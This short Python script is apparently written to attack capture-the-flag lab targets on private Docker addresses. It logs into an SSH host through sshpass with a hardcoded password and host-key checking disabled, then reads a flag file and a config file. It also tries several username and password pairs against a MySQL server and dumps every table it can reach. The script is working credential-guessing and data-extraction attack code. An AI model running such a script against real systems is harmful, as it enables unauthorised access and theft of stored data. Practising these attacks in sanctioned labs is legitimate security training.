#!/usr/bin/env python3
"""Test MySQL and SSH connectivity against CTF targets using direct Docker network IPs."""
import subprocess
import pymysql

# ── TARGET-02: SSH ────────────────────────────────────────────────
print("=== TARGET-02: SSH (10.0.0.20:22) ===")
try:
    result = subprocess.run(
        ["sshpass", "-p", "password123",
         "ssh", "-o", "StrictHostKeyChecking=no",
         "-o", "ConnectTimeout=5",
         "admin@10.0.0.20",
         "cat /home/admin/flag.txt; echo ---; cat /opt/config.ini"],
        capture_output=True, text=True, timeout=10
    )
    print("STDOUT:", result.stdout)
    print("STDERR:", result.stderr)
except Exception as e:
    print(f"SSH error: {e}")

# ── TARGET-04: MySQL ──────────────────────────────────────────────
print("\n=== TARGET-04: MySQL (10.0.0.40:3306) ===")
credentials = [
    ("root",  "MySQL_R00t_2026!"),
    ("root",  "password123"),
    ("admin", "password123"),
]
for user, passwd in credentials:
    try:
        conn = pymysql.connect(
            host="10.0.0.40", port=3306,
            user=user, password=passwd,
            connect_timeout=5
        )
        print(f"[+] Connected as {user}:{passwd}")
        cur = conn.cursor()
        cur.execute("SHOW DATABASES;")
        print("  Databases:", [r[0] for r in cur.fetchall()])
        for db in ["corporate", "flags", "ctf"]:
            try:
                cur.execute(f"USE {db};")
                cur.execute("SHOW TABLES;")
                tables = [r[0] for r in cur.fetchall()]
                print(f"  Tables in {db}:", tables)
                for tbl in tables:
                    cur.execute(f"SELECT * FROM {tbl} LIMIT 5;")
                    rows = cur.fetchall()
                    print(f"    {tbl}:", rows)
            except Exception:
                pass
        conn.close()
        break
    except Exception as e:
        print(f"  Failed {user}:{passwd} — {e}")
